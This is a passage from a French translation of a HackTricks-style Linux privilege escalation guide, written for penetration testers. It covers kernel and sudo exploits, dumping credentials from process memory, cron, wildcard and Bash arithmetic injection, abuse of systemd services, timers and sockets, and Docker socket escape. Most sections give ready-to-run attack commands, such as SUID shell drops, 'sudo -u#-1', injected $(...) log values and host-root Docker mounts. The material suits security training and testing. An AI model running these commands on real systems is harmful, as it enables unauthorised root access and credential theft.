# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informations système

### Informations sur l'OS

Commençons par obtenir des informations sur l'OS en cours d'exécution
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Si vous **avez des permissions d'écriture sur n'importe quel dossier dans la variable `PATH`**, vous pourriez être en mesure de hijack certaines libraries ou binaries :
```bash
echo $PATH
```
### Infos d'environnement

Informations intéressantes, mots de passe ou clés API dans les variables d'environnement ?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Vérifiez la version du kernel et s'il existe un exploit pouvant être utilisé pour escalader les privilèges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Vous pouvez trouver une bonne liste de kernels vulnérables et quelques **compiled exploits** ici: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) et [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
D'autres sites où vous pouvez trouver des **compiled exploits** : [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Pour extraire toutes les versions de kernel vulnérables depuis ce site, vous pouvez faire :
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Outils qui peuvent aider à rechercher kernel exploits :

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (exécuter SUR la victime, vérifie uniquement les exploits pour kernel 2.x)

Toujours **search the kernel version in Google**, peut-être que votre kernel version est indiquée dans un kernel exploit, ce qui vous permettra de vérifier que cet exploit est valide.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Version de sudo

D'après les versions vulnérables de sudo qui apparaissent dans :
```bash
searchsploit sudo
```
Vous pouvez vérifier si la version de sudo est vulnérable en utilisant grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.8.28

De @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg : échec de la vérification de la signature

Consultez **smasher2 box of HTB** pour un **exemple** de la façon dont cette vuln pourrait être exploitée
```bash
dmesg 2>/dev/null | grep "signature"
```
### Plus d'énumération du système
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Énumérer les défenses possibles

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Si vous êtes à l'intérieur d'un docker container vous pouvez essayer de vous en échapper :

{{#ref}}
docker-security/
{{#endref}}

## Disques

Vérifiez **what is mounted and unmounted**, où et pourquoi. Si quelque chose est unmounted vous pouvez essayer de le mount et vérifier s'il contient des informations privées
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Logiciels utiles

Énumérer les binaires utiles
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Vérifiez également si **un compilateur est installé**. Cela est utile si vous devez utiliser un kernel exploit car il est recommandé de le compiler sur la machine où vous allez l'utiliser (ou sur une similaire)
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Logiciels vulnérables installés

Vérifiez la **version des paquets et services installés**. Il se peut qu'il y ait une ancienne version de Nagios (par exemple) qui pourrait être exploitée pour escalating privileges…\  
Il est recommandé de vérifier manuellement la version des logiciels installés les plus suspects.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _Notez que ces commandes afficheront beaucoup d'informations généralement inutiles ; il est donc recommandé d'utiliser des applications comme OpenVAS ou similaires pour vérifier si une version de logiciel installée est vulnérable à des exploits connus_

## Processus

Regardez **quels processus** sont exécutés et vérifiez si un processus possède **plus de privilèges qu'il ne devrait** (peut-être un tomcat exécuté par root ?)
```bash
ps aux
ps -ef
top -n 1
```
Vérifiez toujours la présence possible de [**electron/cef/chromium debuggers** en cours d'exécution, vous pourriez les exploiter pour escalader les privilèges](electron-cef-chromium-debugger-abuse.md). **Linpeas** détecte ceux-ci en vérifiant le paramètre `--inspect` dans la ligne de commande du processus.\
Vérifiez également **vos privilèges sur les binaires des processus**, vous pouvez peut‑être en écraser un.

### Process monitoring

Vous pouvez utiliser des outils comme [**pspy**](https://github.com/DominicBreuker/pspy) pour surveiller les processus. Cela peut être très utile pour identifier des processus vulnérables exécutés fréquemment ou lorsque certaines conditions sont remplies.

### Process memory

Certains services d'un serveur enregistrent des **credentials en clair dans la mémoire**.\
Normalement vous aurez besoin de **root privileges** pour lire la mémoire des processus appartenant à d'autres utilisateurs, donc cela est généralement plus utile lorsque vous êtes déjà root et souhaitez découvrir d'autres credentials.\
Cependant, souvenez-vous que **en tant qu'utilisateur ordinaire vous pouvez lire la mémoire des processus que vous possédez**.

> [!WARNING]
> Notez qu'aujourd'hui la plupart des machines **n'autorisent pas ptrace par défaut**, ce qui signifie que vous ne pouvez pas dumper d'autres processus appartenant à votre utilisateur non privilégié.
>
> Le fichier _**/proc/sys/kernel/yama/ptrace_scope**_ contrôle l'accessibilité de ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: tous les processus peuvent être débogués, tant qu'ils ont le même uid. C'est le mode classique de fonctionnement du ptracing.
> - **kernel.yama.ptrace_scope = 1**: seul un processus parent peut être débogué.
> - **kernel.yama.ptrace_scope = 2**: seul l'admin peut utiliser ptrace, car cela nécessite la capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: Aucun processus ne peut être tracé avec ptrace. Une fois défini, un redémarrage est nécessaire pour réactiver le ptracing.

#### GDB

Si vous avez accès à la mémoire d'un service FTP (par exemple) vous pourriez récupérer le Heap et rechercher à l'intérieur ses credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Pour un PID donné, **les maps montrent comment la mémoire est mappée dans l'espace d'adressage virtuel du processus** ; elles montrent aussi les **permissions de chaque région mappée**. Le pseudo-fichier **mem** **expose la mémoire du processus elle-même**. À partir du fichier **maps** nous savons quelles **régions mémoire sont lisibles** et leurs offsets. Nous utilisons ces informations pour **nous positionner dans le fichier mem et effectuer un dump de toutes les régions lisibles** dans un fichier.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` fournit un accès à la mémoire **physique** du système, pas à la mémoire virtuelle. L'espace d'adresses virtuelles du kernel peut être accédé en utilisant /dev/kmem.\
Typiquement, `/dev/mem` n'est lisible que par **root** et le groupe **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump pour Linux

ProcDump est une réinvention pour Linux de l'outil classique ProcDump de la suite Sysinternals pour Windows. Obtenez-le sur [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Outils

Pour dumper la mémoire d'un process, vous pouvez utiliser :

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Vous pouvez retirer manuellement les root requirements et dumper le process qui vous appartient
- Script A.5 de [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root est requis)

### Identifiants depuis la mémoire des processus

#### Exemple manuel

Si vous constatez que le processus authenticator est en cours d'exécution :
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Vous pouvez dump le process (voir les sections précédentes pour trouver différentes façons de dump la memory d'un process) et rechercher des credentials dans la memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

L'outil [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) va **voler des identifiants en clair depuis la mémoire** et depuis certains **fichiers bien connus**. Il nécessite des privilèges root pour fonctionner correctement.

| Fonctionnalité                                    | Nom du processus     |
| ------------------------------------------------- | -------------------- |
| Mot de passe GDM (Kali Desktop, Debian Desktop)   | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (connexions FTP actives)                   | vsftpd               |
| Apache2 (sessions d'authentification HTTP Basic actives) | apache2       |
| OpenSSH (sessions SSH actives - utilisation de sudo) | sshd:              |

#### Expressions régulières de recherche/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Tâches planifiées/Cron jobs

### Crontab UI (alseambusher) s'exécutant en tant que root – planificateur web privesc

Si un panneau web “Crontab UI” (alseambusher/crontab-ui) s'exécute en tant que root et n'est lié qu'à loopback, vous pouvez quand même y accéder via SSH local port-forwarding et créer une tâche privilégiée pour obtenir un privesc.

Typical chain
- Découvrir un port accessible uniquement depuis loopback (p.ex., 127.0.0.1:8000) et le realm Basic-Auth via `ss -ntlp` / `curl -v localhost:8000`
- Trouver des identifiants dans des artefacts opérationnels :
  - Sauvegardes/scripts utilisant `zip -P <password>`
  - Unité systemd exposant `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Créer le tunnel et se connecter :
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Créer un job à privilèges élevés et l'exécuter immédiatement (dépose un SUID shell) :
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Utilisez-le:
```bash
/tmp/rootshell -p   # root shell
```
Durcissement
- Ne lancez pas Crontab UI en tant que root ; limitez-le à un utilisateur dédié avec les permissions minimales
- Limitez l'écoute à localhost et restreignez l'accès via firewall/VPN ; ne réutilisez pas les mots de passe
- Évitez d'intégrer des secrets dans les unit files ; utilisez des gestionnaires de secrets ou un EnvironmentFile accessible uniquement par root
- Activez l'audit/la journalisation pour les exécutions de jobs à la demande

Vérifiez si une tâche planifiée est vulnérable. Peut-être pouvez-vous tirer parti d'un script exécuté par root (wildcard vuln ? modifier des fichiers que root utilise ? utiliser des symlinks ? créer des fichiers spécifiques dans le répertoire utilisé par root ?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Par exemple, dans _/etc/crontab_ vous pouvez trouver le PATH : _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Remarquez que l'utilisateur "user" a des privilèges d'écriture sur /home/user_)

Si, dans ce crontab, l'utilisateur root tente d'exécuter une commande ou un script sans définir le PATH. Par exemple : _\* \* \* \* root overwrite.sh_\
Vous pouvez alors obtenir un shell root en utilisant :
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron exécutant un script contenant un wildcard (Wildcard Injection)

Si un script exécuté par root contient un “**\***” dans une commande, vous pouvez l'exploiter pour provoquer des comportements inattendus (comme privesc). Exemple :
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Si le wildcard est précédé d'un chemin comme** _**/some/path/\***_ **, il n'est pas vulnérable (même** _**./\***_ **ne l'est pas).**

Lisez la page suivante pour plus d'astuces d'exploitation des wildcards :


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Injection via l'expansion arithmétique Bash dans les parseurs de logs cron

Bash effectue des expansions de paramètres et des substitutions de commande avant l'évaluation arithmétique dans ((...)), $((...)) et let. Si un cron/parser exécuté en root lit des champs de log non fiables et les injecte dans un contexte arithmétique, un attaquant peut insérer une command substitution $(...) qui s'exécute en root lorsque le cron s'exécute.

- Pourquoi cela fonctionne : Dans Bash, les expansions se produisent dans cet ordre : expansion des paramètres/variables, substitution de commande, expansion arithmétique, puis découpage des mots et expansion des chemins. Ainsi, une valeur comme `$(/bin/bash -c 'id > /tmp/pwn')0` est d'abord substituée (exécution de la commande), puis le `0` numérique restant est utilisé pour l'arithmétique de sorte que le script continue sans erreur.

- Exemple de motif vulnérable :
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation : Faites en sorte qu'un texte contrôlé par l'attaquant soit écrit dans le log analysé de sorte que le champ à apparence numérique contienne une command substitution et se termine par un chiffre. Assurez-vous que votre commande n'écrit pas sur stdout (ou redirigez-la) afin que l'opération arithmétique reste valide.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Écrasement de scripts cron et symlink

Si vous **pouvez modifier un script cron** exécuté par root, vous pouvez obtenir un shell très facilement :
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Si le script exécuté par root utilise un **répertoire où vous avez un accès complet**, il peut être utile de supprimer ce dossier et de **créer un symlink vers un autre répertoire** qui sert un script contrôlé par vous.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Tâches cron fréquentes

Vous pouvez surveiller les processus pour rechercher ceux qui s'exécutent toutes les 1, 2 ou 5 minutes. Peut-être que vous pouvez en tirer parti et obtenir une élévation de privilèges.

Par exemple, pour **surveiller toutes les 0,1 s pendant 1 minute**, **trier par commandes les moins exécutées** et supprimer les commandes qui ont été exécutées le plus souvent, vous pouvez faire :
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Vous pouvez aussi utiliser** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (il surveillera et listera chaque processus qui démarre).

### Cron jobs invisibles

Il est possible de créer un cronjob **en mettant un retour chariot après un commentaire** (sans caractère de nouvelle ligne), et le cron job fonctionnera. Exemple (remarquez le caractère retour chariot):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Services

### Fichiers _.service_ modifiables

Vérifiez si vous pouvez écrire un fichier `.service`, si vous le pouvez, vous **pourriez le modifier** pour qu'il **exécute** votre **backdoor lorsque** le service est **démarré**, **redémarré** ou **arrêté** (vous devrez peut-être attendre que la machine soit redémarrée).\
Par exemple, créez votre backdoor dans le fichier `.service` avec **`ExecStart=/tmp/script.sh`**

### Binaires de service modifiables

Gardez à l'esprit que si vous avez **les permissions d'écriture sur des binaires exécutés par des services**, vous pouvez les modifier pour y placer des backdoors, de sorte que lorsque les services seront relancés, les backdoors s'exécuteront.

### systemd PATH - Chemins relatifs

Vous pouvez afficher le PATH utilisé par **systemd** avec:
```bash
systemctl show-environment
```
Si vous constatez que vous pouvez **write** dans n'importe lequel des dossiers du chemin, vous pourriez être en mesure d'**escalate privileges**. Il faut rechercher des fichiers de **service configurations** utilisant des **relative paths**, comme :
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Ensuite, créez un **exécutable** ayant **le même nom que le binaire du chemin relatif** dans le dossier PATH de systemd sur lequel vous pouvez écrire, et lorsque le service est invité à exécuter l'action vulnérable (**Démarrer**, **Arrêter**, **Recharger**), votre **backdoor** sera exécutée (les utilisateurs non privilégiés ne peuvent généralement pas démarrer/arrêter des services, mais vérifiez si vous pouvez utiliser `sudo -l`).

**En savoir plus sur les services avec `man systemd.service`.**

## **Timers**

**Timers** sont des unit files systemd dont le nom se termine par `**.timer**` qui contrôlent des fichiers ou événements `**.service**`. Les **Timers** peuvent être utilisés comme alternative à cron puisqu'ils intègrent la prise en charge des événements temporels basés sur le calendrier et des événements temporels monotones, et peuvent s'exécuter de manière asynchrone.

Vous pouvez énumérer tous les timers avec:
```bash
systemctl list-timers --all
```
### Timers modifiables

Si vous pouvez modifier un timer, vous pouvez le faire exécuter certaines unités existantes de systemd.unit (comme une `.service` ou une `.target`).
```bash
Unit=backdoor.service
```
Dans la documentation vous pouvez lire ce qu'est l'unité :

> L'unité à activer lorsque ce timer expire. L'argument est un nom d'unité, dont le suffixe n'est pas ".timer". Si non spécifié, cette valeur par défaut correspond à un service qui a le même nom que l'unité timer, à l'exception du suffixe. (Voir ci-dessus.) Il est recommandé que le nom de l'unité activée et le nom de l'unité timer soient identiques, à l'exception du suffixe.

Par conséquent, pour abuser de cette permission vous devrez :

- Trouver une unité systemd (comme une `.service`) qui **exécute un binaire modifiable**
- Trouver une unité systemd qui **exécute un chemin relatif** et sur laquelle vous avez des **privilèges d'écriture** sur le **PATH de systemd** (pour usurper cet exécutable)

**En savoir plus sur les timers avec `man systemd.timer`.**

### **Activation du timer**

Pour activer un timer vous avez besoin des privilèges root et d'exécuter :
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Remarque : le **timer** est **activé** en créant un symlink vers lui dans `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) permettent la **communication entre processus** sur la même machine ou entre machines dans des modèles client-serveur. Ils utilisent des fichiers de descripteurs Unix standard pour la communication inter-ordinateurs et sont configurés via des fichiers `.socket`.

Les sockets peuvent être configurés à l'aide de fichiers `.socket`.

**En savoir plus sur les sockets avec `man systemd.socket`.** Dans ce fichier, plusieurs paramètres intéressants peuvent être configurés :

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ces options diffèrent, mais en résumé elles servent à **indiquer où le socket va écouter** (le chemin du fichier de socket AF_UNIX, l'adresse IPv4/6 et/ou le numéro de port à écouter, etc.)
- `Accept`: Prend un argument booléen. Si **true**, une **instance de service est lancée pour chaque connexion entrante** et seul le socket de connexion lui est passé. Si **false**, tous les sockets d'écoute sont **passés à l'unité de service démarrée**, et une seule unité de service est lancée pour toutes les connexions. Cette valeur est ignorée pour les datagram sockets et les FIFOs où une seule unité de service gère inconditionnellement tout le trafic entrant. **Par défaut : false**. Pour des raisons de performance, il est recommandé d'écrire de nouveaux daemons uniquement d'une manière adaptée à `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Acceptent une ou plusieurs lignes de commande, qui sont **exécutées avant** ou **après** la création et le binding des **sockets**/FIFOs, respectivement. Le premier token de la ligne de commande doit être un nom de fichier absolu, suivi des arguments du processus.
- `ExecStopPre`, `ExecStopPost`: Commandes supplémentaires qui sont **exécutées avant** ou **après** la fermeture et la suppression des **sockets**/FIFOs, respectivement.
- `Service`: Spécifie le nom de l'unité **service** **à activer** sur le **trafic entrant**. Cette option n'est autorisée que pour les sockets avec Accept=no. Par défaut, elle désigne le service portant le même nom que le socket (avec le suffixe remplacé). Dans la plupart des cas, il ne devrait pas être nécessaire d'utiliser cette option.

### Fichiers .socket modifiables

Si vous trouvez un fichier `.socket` **modifiable**, vous pouvez **ajouter** au début de la section `[Socket]` quelque chose comme : `ExecStartPre=/home/kali/sys/backdoor` et la backdoor sera exécutée avant que le socket ne soit créé. Par conséquent, vous devrez **probablement attendre que la machine soit redémarrée.**\
_Notez que le système doit utiliser cette configuration de fichier socket, sinon la backdoor ne sera pas exécutée_

### Sockets modifiables

Si vous **identifiez un socket modifiable** (_ici on parle des Unix Sockets et non des fichiers de configuration `.socket`_), alors **vous pouvez communiquer** avec ce socket et éventuellement exploiter une vulnérabilité.

### Énumérer les Unix Sockets
```bash
netstat -a -p --unix
```
### Connexion brute
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exemple d'exploitation :**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Notez qu'il peut y avoir certains **sockets listening for HTTP** requests (_je ne parle pas des .socket files mais des fichiers agissant comme des unix sockets_). Vous pouvez vérifier cela avec :
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Si le socket **répond à une requête HTTP**, alors vous pouvez **communiquer** avec lui et peut-être **exploit some vulnerability**.

### Socket Docker accessible en écriture

Le socket Docker, souvent situé à `/var/run/docker.sock`, est un fichier critique qui doit être sécurisé. Par défaut, il est accessible en écriture par l'utilisateur `root` et les membres du groupe `docker`. Posséder un accès en écriture à ce socket peut conduire à privilege escalation. Voici une répartition de la façon dont cela peut être fait et des méthodes alternatives si le Docker CLI n'est pas disponible.

#### **Privilege Escalation with Docker CLI**

Si vous avez un accès en écriture au socket Docker, vous pouvez escalate privileges en utilisant les commandes suivantes:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ces commandes vous permettent d'exécuter un container avec un accès root au système de fichiers de l'hôte.

#### **Utiliser Docker API directement**

Dans les cas où la CLI Docker n'est pas disponible, le Docker socket peut quand même être manipulé en utilisant le Docker API et des commandes `curl`.

1.  **List Docker Images:** Récupérez la liste des images disponibles.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Envoyez une requête pour créer un container qui monte le répertoire racine du système hôte.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Démarrez le container nouvellement créé :

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Utilisez `socat` pour établir une connexion au container, permettant l'exécution de commandes à l'intérieur.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Après avoir établi la connexion `socat`, vous pouvez exécuter des commandes directement dans le container avec un accès root au système de fichiers de l'hôte.

### Autres

Notez que si vous avez des permissions d'écriture sur le docker socket parce que vous êtes **inside the group `docker`** vous avez [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). If the [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Check **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Escalade de privilèges Containerd (ctr)

Si vous constatez que vous pouvez utiliser la commande **`ctr`**, lisez la page suivante car **vous pourriez être en mesure de l'abuser pour escalader les privilèges** :


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** escalade de privilèges

Si vous constatez que vous pouvez utiliser la commande **`runc`**, lisez la page suivante car **vous pourriez être en mesure de l'abuser pour escalader les privilèges** :


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus est un système sophistiqué de **communication inter-processus (IPC)** qui permet aux applications d'interagir efficacement et de partager des données. Conçu pour les systèmes Linux modernes, il offre un cadre robuste pour différentes formes de communication entre applications.

Le système est polyvalent, prenant en charge l'IPC de base qui améliore l'échange de données entre les processus, rappelant des **enhanced UNIX domain sockets**. De plus, il facilite la diffusion d'événements ou de signaux, favorisant une intégration fluide entre les composants système. Par exemple, un signal d'un daemon Bluetooth annonçant un appel entrant peut inciter un lecteur musical à couper le son, améliorant l'expérience utilisateur. En outre, D-Bus prend en charge un système d'objets distants, simplifiant les requêtes de service et les invocations de méthodes entre applications, rationalisant des processus qui étaient traditionnellement complexes.

D-Bus fonctionne selon un **allow/deny model**, gérant les permissions de messages (appels de méthode, émissions de signaux, etc.) en fonction de l'effet cumulatif des règles de politique correspondantes. Ces politiques spécifient les interactions avec le bus, pouvant potentiellement permettre une escalade de privilèges via l'exploitation de ces permissions.

Un exemple d'une telle politique dans `/etc/dbus-1/system.d/wpa_supplicant.conf` est fourni, détaillant les permissions pour l'utilisateur root de posséder, d'envoyer et de recevoir des messages depuis `fi.w1.wpa_supplicant1`.

Les politiques sans utilisateur ou groupe spécifié s'appliquent universellement, tandis que les politiques de contexte "default" s'appliquent à tous ceux qui ne sont pas couverts par d'autres politiques spécifiques.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Apprenez comment énumérer et exploiter une communication D-Bus ici :**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Réseau**

